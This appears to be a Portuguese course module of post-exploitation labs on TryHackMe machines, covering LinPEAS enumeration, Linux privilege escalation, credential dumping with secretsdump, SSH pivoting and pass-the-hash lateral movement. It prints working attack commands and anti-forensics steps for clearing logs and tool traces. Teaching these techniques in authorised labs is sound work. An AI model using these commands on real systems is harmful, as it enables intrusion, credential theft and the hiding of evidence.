# 🕵️ Módulo 5 — Labs de Pós-Exploração

> Laboratórios práticos de enumeração, escalação de privilégios, movimentação lateral e pivoting.

---

## Pré-requisitos

| Item | Mínimo | Recomendado |
|------|--------|-------------|
| Sistema | Linux (Kali/Parrot) | Kali 2024+ |
| RAM | 4 GB | 8 GB |
| Disco | 20 GB livre | 50 GB |
| Ferramentas | LinPEAS, secretsdump, psexec | + proxychains, evil-winrm, impacket |
| Conhecimento | Módulos 1-4 concluídos | — |
| Network | Acesso a máquinas THM | Labs internos |

---

## Exercício 1: Enumeração com LinPEAS

⏱ **Tempo estimado:** 40 min

### 🎯 Objetivo
Utilizar o LinPEAS para enumerar um sistema Linux e identificar vetores de escalação de privilégios.

### 📚 Conhecimentos Necessários
- Arquitetura de permissões Linux (SUID, SGID, capabilities)
- Cron jobs e serviços agendados
- Variáveis de ambiente e PATH manipulation
- Arquivos sensíveis e configurações incorretas

### 🛠 Ferramentas
- `linpeas.sh` — script de enumeração
- `curl` ou `wget` — transferência do script
- `chmod` — tornar executável

### 📋 Passo a Passo

1. **Copie o LinPEAS para a máquina alvo** (via web download, SCP, etc.):
```bash
# Opção 1: Web download (requer internet no alvo)
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh -o linpeas.sh

# Opção 2: Transferência via Python HTTP server (da sua máquina)
python3 -m http.server 8000
wget http://<SEU_IP>:8000/linpeas.sh
```

2. **Torne executável e rode:**
```bash
chmod +x linpeas.sh
./linpeas.sh
```

3. **Analise a saída** — o output é colorido:
   - 🟢 **Verde** — informação importante
   - 🔴 **Vermelho** — vulnerabilidade encontrada
   - 🟡 **Amarelo** —,item potencialmente perigoso

4. **Foque nas seções:**
   - SUID binaries
   - Capabilities
   - Cron jobs
   - Arquivos com credenciais
   - Kernel version

5. **Cruze os resultados** com [GTFOBins](https://gtfobins.github.io/).

### 💡 Macetes
- O LinPEAS salva output em `/tmp/linpeas/` — confira os arquivos
- **Seções mais importantes:**
  - `SUID Binaries` → busque no GTFOBins
  - `Capabilities` → busque no GTFOBins
  - `Cron Jobs` → verifique scripts executáveis
  - `Interesting Files` → busque senhas hardcoded
  - `Network` → interfaces e rotas internas
- Se o output for muito grande, pipe para less: `./linpeas.sh | less -R`
- Alternativa: `linpeas.sh -a` para modo completo

### ✅ Checklist
- [ ] Copiei o LinPEAS para a máquina alvo
- [ ] Executei como usuário normal (não root)
- [ ] Analisei o output completo
- [ ] Identifiquei pelo menos 3 vetores potenciais
- [ ] Cruzei resultados com GTFOBins
- [ ] Documentei os achados

### 📎 Links
- [TryHackMe — Linux Privesc](https://tryhackme.com/room/linprivesc)
- [LinPEAS GitHub](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS)
- [GTFOBins](https://gtfobins.github.io/)

---

## Exercício 2: Escalação de Privilégios Linux

⏱ **Tempo estimado:** 45 min

### 🎯 Objetivo
Escalar de usuário normal para root em um sistema Linux explorando configurações incorretas.

### 📚 Conhecimentos Necessários
- Binários SUID e como explora-los
- Exploits de kernel
- Configuração sudo incorreta (`sudo -l`)
- Variável PATH e hijacking

### 🛠 Ferramentas
- `GTFOBins` — referência de binários exploráveis
- `linux-exploit-suggester` — sugere exploits de kernel
- `sudo` — verificação de permissões

### 📋 Passo a Passo

1. **Verifique permissões sudo:**
```bash
sudo -l
```

2. Se encontrar binários sudo sem senha → consulte GTFOBins:
   - Ex: `sudo vim` → `sudo vim -c ':!sh'`
   - Ex: `sudo find . -exec /bin/sh \; -quit`

3. **Busque binários SUID:**
```bash
find / -perm -4000 2>/dev/null
```

4. Para cada binário SUID → GTFOBins:
   - Ex: `find / -perm -u=s -type f 2>/dev/null`
   - Exemplo: `/usr/bin/vim` → exploração similar

5. **Verifique capabilities:**
```bash
getcap -r / 2>/dev/null
```

6. **Verifique kernel:**
```bash
uname -r
# Pesquise exploits para essa versão
```

7. **Verifique cron jobs:**
```bash
cat /etc/crontab
ls -la /etc/cron.*
```

### 💡 Macetes
- **Checklist de escalação:**
  1. `sudo -l` → GTFOBins
  2. `find / -perm -4000` → GTFOBins
  3. `getcap -r /` → GTFOBins
  4. `cat /etc/crontab` → scripts.writables
  5. `uname -r` → kernel exploits
  6. Variáveis de ambiente → PATH hijack
- **GTFOBins é sua melhor amiga** — bookmark esta página!
- Se encontrar `env` como SUID: `./env /bin/sh -p`
- Se encontrar `bash` como SUID: `./bash -p`

### ✅ Checklist
- [ ] Executei `sudo -l` e analisei o output
- [ ] Busquei binários SUID (`find / -perm -4000`)
- [ ] Consultei cada achado no GTFOBins
- [ ] Verifiquei capabilities do sistema
- [ ] Verifiquei cron jobs por scripts writables
- [ ] Verifiquei versão do kernel
- [ ] Obtive shell root

### 📎 Links
- [TryHackMe — Linux Privesc](https://tryhackme.com/room/linprivesc)
- [GTFOBins](https://gtfobins.github.io/)
- [HackTricks — Linux Privesc](https://book.hacktricks.xyz/linux-hardening/privilege-escalation)

---

## Exercício 3: Dump de Credenciais com secretsdump

⏱ **Tempo estimado:** 35 min

### 🎯 Objetivo
Extrair hashes NTLM e credenciais de uma máquina Windows comprometida usando secretsdump.

### 📚 Conhecimentos Necessários
- SAM (Security Account Manager) e como armazena hashes
- LSA (Local Security Authority) e secrets
- NTDS.dit (Active Directory)
- Diferença entre local e domain dump

### 🛠 Ferramentas
- `secretsdump.py` — da suíte Impacket
- `psexec.py` — conexão remota
- `evil-winrm` — alternativa

### 📋 Passo a Passo

1. **Se tem credenciais locais (admin):**
```bash
secretsdump.py administrator:'senha@123'@<IP_ALVO>
```

2. **Se tem hash NTLM:**
```bash
secretsdump.py administrator@<IP_ALVO> -hashes :NTHASH_AQUI
```

3. **Dump apenas NTLM (mais rápido):**
```bash
secretsdump.py administrator:'senha'@<IP_ALVO> --just-dc-ntlm
```

4. **Dump local (SAM):**
```bash
secretsdump.py administrator:'senha'@<IP_ALVO> -sam SAM -system SYSTEM -security SECURITY
```

5. **Use os hashes capturados** para pass-the-hash:
```bash
psexec.py administrator@<IP_ALVO> -hashes :NTHASH
```

### 💡 Macetes
- **Precisa de credenciais de admin** para funcionar
- **Formatos de hash NTLM:** `LMHASH:NTHASH` (às vezes LM é `aad3b435...`)
- **Opções úteis:**
  - `--just-dc-ntlm` → apenas hashes NTLM (mais rápido)
  - `--just-dc-user <user>` → dump de usuário específico
  - `-outputfile hashes.txt` → salvar em arquivo
- **Atenção:** dump pode ser detectado por EDR/AV
- **Alternativa:** `pypykatz` para dump offline do LSASS

### ✅ Checklist
- [ ] Identifiquei credenciais admin ou hash NTLM
- [ ] Executei secretsdump com sucesso
- [ ] Obtive hashes SAM (usuarios locais)
- [ ] (Bônus) Obtive hashes LSA/NTDS (se AD)
- [ ] Salvei hashes em arquivo
- [ ] Testei pass-the-hash com os hashes obtidos

### 📎 Links
- [TryHackMe — Ice](https://tryhackme.com/room/ice)
- [Impacket GitHub](https://github.com/fortra/impacket)
- [Secretsdump Usage](https://github.com/fortra/impacket/blob/master/examples/secretsdump.py)

---

## Exercício 4: Pivoting com SSH Tunnel

⏱ **Tempo estimado:** 40 min

### 🎯 Objetivo
Criar túneis SSH para acessar redes internas através de uma máquina comprometida.

### 📚 Conhecimentos Necessários
- SSH tunneling (local, remote, dynamic)
- SOCKS proxy e proxychains
- Encaminhamento de portas
- Redes internas e roteamento

### 🛠 Ferramentas
- `ssh` — túneis SSH
- `proxychains` — forçar tráfego através do proxy
- `nmap` — varredura da rede interna

### 📋 Passo a Passo

1. **Dynamic SOCKS Proxy (mais comum):**
```bash
ssh -D 1080 user@<IP_ALVO>
# Agora localhost:1080 é um proxy SOCKS
```

2. **Configure proxychains** (`/etc/proxychains4.conf`):
```
[ProxyList]
socks5 127.0.0.1 1080
```

3. **Varredura da rede interna via proxy:**
```bash
proxychains nmap -sT 10.0.0.0/24
proxychains nmap -sT -p 22,80,443 10.0.0.0/24
```

4. **Acessar serviço interno:**
```bash
proxychains curl http://10.0.0.50
proxychains ssh user@10.0.0.50
```

5. **Local Port Forwarding:**
```bash
ssh -L 8080:10.0.0.50:80 user@<IP_ALVO>
# Acesse localhost:8080 = 10.0.0.50:80
```

6. **Remote Port Forwarding:**
```bash
ssh -R 9090:localhost:8080 user@<IP_ALVO>
# Porta 9090 no alvo redireciona para localhost:8080
```

### 💡 Macetes
- **Tipos de tunnel:**
  | Tipo | Flag | Uso |
  |------|------|-----|
  | Dynamic | `-D` | SOCKS proxy geral |
  | Local | `-L` | Acessar serviço remoto localmente |
  | Remote | `-R` | Exposto serviço local no remoto |
- **proxychains** força qualquer programa a usar o SOCKS proxy
- **VPN alternativa:** use SSH com `-w` para criar tunelamento L3
- Se precisar de DNS: `proxychains -f /etc/proxychains4.conf dig target.local`

### ✅ Checklist
- [ ] Consegui SSH shell na máquina pivot
- [ ] Configurei SOCKS proxy com `-D 1080`
- [ ] Configurei proxychains corretamente
- [ ] Vareei a rede interna com nmap via proxy
- [ ] Acedi pelo menos um serviço interno
- [ ] Documentei a topologia da rede interna

### 📎 Links
- [TryHackMe — Internal](https://tryhackme.com/room/internal)
- [SSH Tunneling — HackTricks](https://book.hacktricks.xyz/generic-methodologies-and-resources/tunneling-and-port-forwarding)
- [Proxychains Guide](https://github.com/haad/proxychains)

---

## Exercício 5: Movimentação Lateral com Pass-the-Hash

⏱ **Tempo estimado:** 45 min

### 🎯 Objetivo
Utilizar hashes NTLM capturados para acessar outras máquinas na rede (lateral movement).

### 📚 Conhecimentos Necessários
- Protocolo NTLM e autenticação Windows
- Pass-the-Hash (PtH) e como funciona
- SMB, WMI, WinRM como vetores
- Diferença entre PtH e credential reuse

### 🛠 Ferramentas
- `psexec.py` — execução remota via SMB
- `evil-winrm` — shell via WinRM
- `wmiexec.py` — execução via WMI
- `secretsdump.py` — captura de hashes

### 📋 Passo a Passo

1. **Tenha hashes NTLM** (via secretsdump ou captura anterior).

2. **Pass-the-Hash com psexec:**
```bash
psexec.py administrator@<IP_ALVO> -hashes :NTHASH
```

3. **Pass-the-Hash com evil-winrm:**
```bash
evil-winrm -i <IP_ALVO> -u administrator -H NTHASH
```

4. **Pass-the-Hash com wmiexec:**
```bash
wmiexec.py administrator@<IP_ALVO> -hashes :NTHASH
```

5. **Verifique acesso a outras máquinas** na rede:
```bash
# Dentro da shell obtida
net user
ipconfig
systeminfo
dir \\<IP_OUTRA_MAQUINA>\C$
```

6. **Repita o processo** para movimentar lateralmente.

### 💡 Macetes
- **Formato do hash NTLM:** `LMHASH:NTHASH`
  - Se LM for `aad3b435b51404eeaad3b435b51404ee`, é vazio → use só NTLM
  - Exemplo: `-hashes :32693b11e6aa90eb43d32c72a07ceea6`
- **Vetores de movimentação lateral:**
  | Ferramenta | Protocolo | Comando |
  |------------|-----------|---------|
  | psexec.py | SMB/RPC | `psexec.py user@IP -hashes :HASH` |
  | wmiexec.py | WMI | `wmiexec.py user@IP -hashes :HASH` |
  | evil-winrm | WinRM | `evil-winrm -i IP -u user -H HASH` |
  | smbexec.py | SMB | `smbexec.py user@IP -hashes :HASH` |
- **Verifique quais hashes funcionam em quais máquinas**
- **Use CrackMapExec** para testar hash em múltiplos hosts:
```bash
crackmapexec smb 10.0.0.0/24 -u administrator -H NTHASH
```

### ✅ Checklist
- [ ] Tenho hashes NTLM válidos
- [ ] Acedi uma máquina via psexec/evil-winrm/wmiexec
- [ ] Listei recursos da máquina comprometida
- [ ] Identifiquei outras máquinas na rede
- [ ] Testei o hash em outras máquinas (CrackMapExec)
- [ ] Acedi pelo menos 1 máquina adicional
- [ ] Documentei o caminho de movimentação

### 📎 Links
- [TryHackMe — Overpass](https://tryhackme.com/room/overpass)
- [Impacket Examples](https://github.com/fortra/impacket/tree/master/examples)
- [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec)

---

## Exercício 6: Pós-Exploração Completa (Desafio Final)

⏱ **Tempo estimado:** 90 min

### 🎯 Objetivo
Executar pós-exploração completa: escalação de privilégios, enumeração de rede, movimentação lateral e coleta de evidências.

### 📚 Conhecimentos Necessários
- Todas as técnicas dos exercícios 1-5
- Planejamento de pós-exploração
- Documentação para relatório
- Anti-forensics básico (não deixar rastros)

### 🛠 Ferramentas
- `LinPEAS` / `WinPEAS` — enumeração
- `secretsdump.py` — dump de credenciais
- `psexec.py` / `evil-winrm` — movimentação
- `proxychains` — pivoting

### 📋 Passo a Passo

1. **Enumere o sistema comprometido:**
   - Linux: `linpeas.sh`
   - Windows: `winpeas.exe`

2. **Escale de privilégios:**
   - Identifique vetores com LinPEAS
   - Aplique exploração (SUID, sudo, kernel)
   - Obtenha root/admin

3. **Dump de credenciais:**
   - Windows: `secretsdump.py`
   - Linux: `/etc/shadow`, `/etc/passwd`

4. **Enumere a rede:**
```bash
# Linux
ip a
ip route
cat /etc/resolv.conf
nmap -sn 10.0.0.0/24

# Windows
ipconfig /all
route print
arp -a
```

5. **Movimente lateralmente:**
   - Use hashes capturados
   - psexec, evil-winrm, wmiexec
   - Documente cada acesso

6. **Documente tudo:**
   - Cada máquina acessada
   - Cada credencial encontrada
   - Cada vulnerabilidade explorada
   - Screenshots e logs

### 💡 Macetes
- **Fluxo completo de pós-exploração:**
  1. Enumerar → 2. Escalar → 3. Capturar credenciais → 4. Enumerar rede → 5. Movimentar → 6. Repetir
- **Anti-forensics:**
  - Limpe logs: `history -c`, `rm ~/.bash_history`
  - Delete binários de exploração
  - Use live memory (não disco) quando possível
- **Documentação é crucial:**
  - Máquinas acessadas (IP, OS, serviços)
  - Credenciais obtidas (usuário, hash, método)
  - Vulnerabilidades (CVE, descrição)
  - Screenshots de comandos importantes
- **Não repita tentativas** — se bloqueado, mude de abordagem

### ✅ Checklist
- [ ] Executei enumeração completa (LinPEAS/WinPEAS)
- [ ] Escalei para root/admin em pelo menos 1 máquina
- [ ] Capturei credenciais (hashes, senhas)
- [ ] Mapeei a rede interna
- [ ] Movimentei lateralmente para 2+ máquinas
- [ ] Documentei cada passo detalhadamente
- [ ] Limpei rastros da exploração
- [ ] Montei relatório final estruturado

### 📎 Links
- [TryHackMe — Internal](https://tryhackme.com/room/internal)
- [TryHackMe — Overpass](https://tryhackme.com/room/overpass)
- [HackTricks — Post Exploitation](https://book.hacktricks.xyz/generic-methodologies-and-resources/post-exploitation)
- [MITRE ATT&CK — Lateral Movement](https://attack.mitre.org/tactics/TA0008/)

---

## 📊 Resumo dos Labs

| # | Exercício | Ferramentas | Tempo |
|---|-----------|-------------|-------|
| 1 | Enumeração LinPEAS | linpeas.sh | 40 min |
| 2 | Escalação Linux | GTFOBins, sudo | 45 min |
| 3 | Dump Credenciais | secretsdump.py | 35 min |
| 4 | SSH Tunnel | ssh, proxychains | 40 min |
| 5 | Pass-the-Hash | psexec, evil-winrm | 45 min |
| 6 | Pós-Exploração | Todas | 90 min |

---

> ⚠️ **AVISO LEGAL:** Estes labs são para fins educacionais. Pratique apenas em ambientes que você tem autorização para testar. Pós-exploração em sistemas sem autorização é crime.
